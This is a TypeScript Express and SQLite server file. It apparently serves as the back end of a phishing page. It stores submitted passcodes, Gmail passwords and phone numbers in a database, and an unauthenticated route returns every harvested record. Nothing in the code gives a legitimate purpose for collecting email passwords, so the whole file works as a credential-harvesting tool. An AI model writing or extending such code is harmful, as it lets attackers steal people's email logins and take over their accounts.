import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const dbPath = path.resolve(__dirname, "submissions.db");
let db: Database.Database;
try {
  db = new Database(dbPath);
  console.log(`Database initialized at ${dbPath}`);
  
  // Initialize database
  db.exec(`
    CREATE TABLE IF NOT EXISTS submissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      passcode TEXT,
      gmail_password TEXT,
      phone_number TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  console.log("Submissions table ensured");

  // Write test
  try {
    db.prepare("INSERT INTO submissions (passcode) VALUES (?)").run("init_test");
    db.prepare("DELETE FROM submissions WHERE passcode = ?").run("init_test");
    console.log("Database write test successful");
  } catch (writeErr) {
    console.error("Database write test failed:", writeErr);
  }
} catch (err) {
  console.error("Failed to initialize database:", err);
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());
  app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
  });

  // Test route
  app.get("/api/test", (req, res) => {
    res.json({ message: "API is working", time: new Date().toISOString() });
  });

  // API Route to handle submissions
  app.post("/api/submit", (req, res) => {
    console.log("POST /api/submit hit with body:", req.body);
    const { passcode, gmailPassword, phoneNumber } = req.body;
    
    if (!passcode && !gmailPassword && !phoneNumber) {
      return res.status(400).json({ error: "Empty submission" });
    }
    
    try {
      const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
      const result = stmt.run(passcode || "", gmailPassword || "", phoneNumber || "");
      
      console.log("Successfully saved submission, ID:", result.lastInsertRowid);
      res.json({ success: true, id: result.lastInsertRowid });
    } catch (error) {
      console.error("Database error during save:", error);
      res.status(500).json({ error: "Failed to save submission" });
    }
  });

  // API Route to view submissions
  app.get("/api/submissions", (req, res) => {
    console.log("GET /api/submissions hit");
    try {
      const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
      console.log(`Returning ${rows.length} submissions`);
      res.json(rows);
    } catch (error) {
      console.error("Database error during fetch:", error);
      res.status(500).json({ error: "Failed to fetch submissions" });
    }
  });

  // Vite middleware for development
  let vite: any;
  if (process.env.NODE_ENV !== "production") {
    vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom", // Changed to custom to handle fallback manually
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, "dist")));
  }

  // Catch-all route to serve index.html for SPA routing
  app.get("*", async (req, res, next) => {
    const url = req.originalUrl;

    try {
      if (process.env.NODE_ENV !== "production") {
        // In development, read and transform index.html via Vite
        let template = fs.readFileSync(path.resolve(__dirname, "index.html"), "utf-8");
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ "Content-Type": "text/html" }).end(template);
      } else {
        // In production, serve the built index.html
        res.sendFile(path.join(__dirname, "dist", "index.html"));
      }
    } catch (e: any) {
      if (process.env.NODE_ENV !== "production") {
        vite.ssrFixStacktrace(e);
      }
      next(e);
    }
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
